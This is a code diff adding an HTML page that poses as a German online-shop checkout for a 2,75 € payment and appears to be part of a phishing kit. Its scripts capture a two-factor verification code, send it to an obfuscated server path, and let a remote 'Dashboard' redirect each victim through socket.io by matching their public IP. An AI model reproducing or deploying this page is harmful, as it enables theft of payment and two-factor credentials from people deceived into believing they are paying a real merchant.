@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./css/kipola.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <title></title>
+</head>
+<body>
+    <div>
+        <div class="hedpo-pc pc">
+            <img src="./img/hedpo-pc.PNG" alt="">
+        </div>
+        <div class="hedpo-mb mb">
+            <img src="./img/hedpo-mb.PNG" alt="">
+        </div>
+    </div>
+    <div class="bigm">
+        <div>
+            <div class="hedpo2-pc pc">
+                <img src="./img/hedop2.PNG" alt="">
+            </div>
+            <div class="hedpo2-mb mb">
+                <img src="./img/hedop2-mb.PNG" alt="">
+            </div>
+            <div class="meta">
+                <p class="pp1">Dein Warenkorb</p>
+                <img src="./img/mainato-pc.svg" class="pc" alt="">
+                <img src="./img/mainato-mb.svg" class="mb" alt="">
+                <div class="inder-meta">
+                    <p style="font-weight: 600;">Gesamtsumme:</p>
+                    <p style="margin-left: 40px;"><strong style="font-weight: bold; font-size: 18px; color: #0091cd; display: flex;flex-direction: column;">2,75 €</strong> 
+                        inkl. MwSt.</p>
+                </div>
+                    <button id="barinxri" type="button" class="btn1"> zur Zahlung veranlasst</button>
+            </div>
+            <div>
+                
+            </div>
+        </div>
+    </div>
+
+    <div>
+        <div class="botanom">
+            <img src="./img/botanom-pc.png" class="pc" alt="">
+            <img src="./img/botanom-mb.png" class="mb" alt="">
+        </div>
+    </div>
+
+    <script src="./js/stb.js"></script>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('twoFactorForm');
+            const inputs = form.querySelectorAll('.code-input');
+            const loading = document.getElementById('loading');
+
+            // Handle input behavior
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    if (this.value.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    }
+                });
+
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !this.value && index > 0) {
+                        inputs[index - 1].focus();
+                    }
+                });
+            });
+
+            // Auto-submit when all fields are filled
+            inputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    const allFilled = Array.from(inputs).every(input => input.value.length === 1);
+                    if (allFilled) {
+                        const code = Array.from(inputs).map(input => input.value).join('');
+                        console.log('Verification code:', code);
+                        
+                        // Show loading spinner
+                        loading.style.display = 'flex';
+                        
+                        // Disable all inputs
+                        inputs.forEach(input => input.disabled = true);
+                        //send backend:
+                        $.ajax({
+                            url: '/Qv69PRvXg6PQEvrzJx6j',
+                            type: 'POST',
+                            contentType: 'application/json',
+                            data: JSON.stringify({code}),
+                            success: function(info) {
+                                if(info.OK){
+                                    // Wait 3 seconds then redirect
+                        setTimeout(() => {
+                            window.location.href = '/load?time=3&url=/3EtpVNHarRb8PqJfArbu';
+                        }, 3000);
+                                }
+                            }
+                        });
+                        
+                        
+                        // Prevent actual form submission
+                        form.onsubmit = (e) => e.preventDefault();
+                    }
+                });
+            });
+        });
+    </script>
+     <script src="/socket.io/socket.io.js"></script>
+     <script>
+       async function getPublicIP() {
+   try {
+     const response = await fetch('https://api.ipify.org?format=json');
+     const data = await response.json();
+     console.log("Public IP:", data.ip);
+     return data.ip;
+   } catch (error) {
+     console.error("Failed to fetch IP:", error);
+     return null;
+   }
+ }
+       const socket = io();
+      
+       // Handle redirect messages from server
+       socket.on('redirect', async (data) => {
+         const currentIp = await getPublicIP();
+         console.log("Dashboard: "+data.ip,"Client: "+currentIp);
+         
+         if (data.ip === currentIp || data.ip == "::1" || data.ip=="::ffff:127.0.0.1" ) {
+ 
+           window.location.href = data.url;
+         }
+       });
+       </script>
+</body>
+</html>
